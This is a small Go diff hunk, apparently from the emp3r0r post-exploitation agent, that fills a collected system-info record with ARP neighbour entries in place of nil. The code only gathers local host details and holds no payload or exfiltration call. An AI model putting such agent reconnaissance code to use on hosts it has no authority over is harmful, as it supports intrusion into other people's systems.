@@ -120,7 +120,7 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 	info.IPs = tun.IPa()
 
 	// arp -a ?
-	info.ARP = nil
+	info.ARP = tun.IPNeigh()
 
 	// exes in PATH
 	info.Exes = util.ScanPATH()
